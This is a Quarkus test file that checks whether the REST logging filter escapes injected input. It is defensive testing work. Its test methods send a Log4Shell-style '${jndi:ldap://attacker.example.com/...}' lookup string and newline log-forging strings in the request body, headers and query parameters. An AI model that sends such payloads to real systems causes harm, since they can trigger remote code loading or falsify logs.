package io.quarkus.resteasy.reactive.server.test.logging;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.List;
import java.util.logging.LogRecord;
import java.util.stream.Collectors;

import jakarta.ws.rs.Consumes;
import jakarta.ws.rs.GET;
import jakarta.ws.rs.POST;
import jakarta.ws.rs.Path;
import jakarta.ws.rs.Produces;
import jakarta.ws.rs.QueryParam;
import jakarta.ws.rs.core.MediaType;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.RegisterExtension;

import io.quarkus.test.QuarkusExtensionTest;
import io.restassured.RestAssured;

public class ServerLoggingFilterSanitizationTest {

    @RegisterExtension
    static final QuarkusExtensionTest test = new QuarkusExtensionTest()
            .withApplicationRoot(jar -> jar.addClasses(TestResource.class))
            .overrideRuntimeConfigKey("quarkus.rest.logging.scope", "request-response")
            .overrideRuntimeConfigKey("quarkus.rest.logging.include-body", "true")
            .overrideRuntimeConfigKey("quarkus.rest.logging.body-limit", "500")
            .setLogRecordPredicate(record -> "io.quarkus.rest.logging".equals(record.getLoggerName()))
            .assertLogRecords(records -> {
                List<String> messages = records.stream().map(LogRecord::getMessage).collect(Collectors.toList());

                // --- Newline injection in body ---
                // The body "\nResponse: FAKE" must not appear as a separate log line
                String newlineBodyLog = messages.stream()
                        .filter(m -> m.startsWith("Request: POST") && m.contains("/log-test/sanitize/body-newline"))
                        .findFirst()
                        .orElseThrow();
                assertThat(newlineBodyLog)
                        .contains("\\n") // newline is escaped, not literal
                        .doesNotContain("\nResponse: FAKE"); // injected line must not appear literally

                // --- Lookup injection in body ---
                // ${jndi:...} must be escaped before reaching the logging backend
                String lookupBodyLog = messages.stream()
                        .filter(m -> m.startsWith("Request: POST") && m.contains("/log-test/sanitize/body-lookup"))
                        .findFirst()
                        .orElseThrow();
                assertThat(lookupBodyLog)
                        .contains("$\\{jndi:") // lookup sequence is escaped
                        .doesNotContain("${jndi:"); // raw sequence must not appear

                // --- Newline injection in header value ---
                // HTTP clients strip bare \n from header values (illegal per HTTP/1.1), so the value
                // arrives already without a literal newline. Either way, no literal newline must appear.
                String newlineHeaderLog = messages.stream()
                        .filter(m -> m.startsWith("Request: GET") && m.contains("/log-test/sanitize/header-newline"))
                        .findFirst()
                        .orElseThrow();
                assertThat(newlineHeaderLog)
                        .contains("X-Custom=")
                        .doesNotContain("X-Custom=before\nResponse: FAKE"); // literal newline must not appear

                // --- Lookup injection in header value ---
                String lookupHeaderLog = messages.stream()
                        .filter(m -> m.startsWith("Request: GET") && m.contains("/log-test/sanitize/header-lookup"))
                        .findFirst()
                        .orElseThrow();
                assertThat(lookupHeaderLog)
                        .contains("$\\{jndi:")
                        .doesNotContain("${jndi:");

                // --- Newline injection in query parameter (URI) ---
                String uriLog = messages.stream()
                        .filter(m -> m.startsWith("Request: GET") && m.contains("/log-test/sanitize/uri"))
                        .findFirst()
                        .orElseThrow();
                assertThat(uriLog).doesNotContain("\nResponse: FAKE");
            });

    @Test
    void testBodyNewlineInjection() {
        RestAssured.given()
                .contentType(MediaType.TEXT_PLAIN)
                .body("\nResponse: FAKE /admin, Status[200 OK]")
                .post("/log-test/sanitize/body-newline")
                .then()
                .statusCode(200);
    }

    @Test
    void testBodyLookupInjection() {
        RestAssured.given()
                .contentType(MediaType.TEXT_PLAIN)
                .body("${jndi:ldap://attacker.example.com/x}")
                .post("/log-test/sanitize/body-lookup")
                .then()
                .statusCode(200);
    }

    @Test
    void testHeaderNewlineInjection() {
        RestAssured.given()
                .header("X-Custom", "before\nResponse: FAKE /admin, Status[200 OK]")
                .get("/log-test/sanitize/header-newline")
                .then()
                .statusCode(200);
    }

    @Test
    void testHeaderLookupInjection() {
        RestAssured.given()
                .header("X-Custom", "${jndi:ldap://attacker.example.com/x}")
                .get("/log-test/sanitize/header-lookup")
                .then()
                .statusCode(200);
    }

    @Test
    void testUriInjection() {
        RestAssured.given()
                .queryParam("q", "\nResponse: FAKE /admin, Status[200 OK]")
                .get("/log-test/sanitize/uri")
                .then()
                .statusCode(200);
    }

    @Path("/log-test/sanitize")
    public static class TestResource {

        @POST
        @Path("/body-newline")
        @Consumes(MediaType.TEXT_PLAIN)
        @Produces(MediaType.TEXT_PLAIN)
        public String bodyNewline(String body) {
            return body;
        }

        @POST
        @Path("/body-lookup")
        @Consumes(MediaType.TEXT_PLAIN)
        @Produces(MediaType.TEXT_PLAIN)
        public String bodyLookup(String body) {
            return body;
        }

        @GET
        @Path("/header-newline")
        @Produces(MediaType.TEXT_PLAIN)
        public String headerNewline() {
            return "ok";
        }

        @GET
        @Path("/header-lookup")
        @Produces(MediaType.TEXT_PLAIN)
        public String headerLookup() {
            return "ok";
        }

        @GET
        @Path("/uri")
        @Produces(MediaType.TEXT_PLAIN)
        public String uri(@QueryParam("q") String q) {
            return "ok";
        }
    }
}
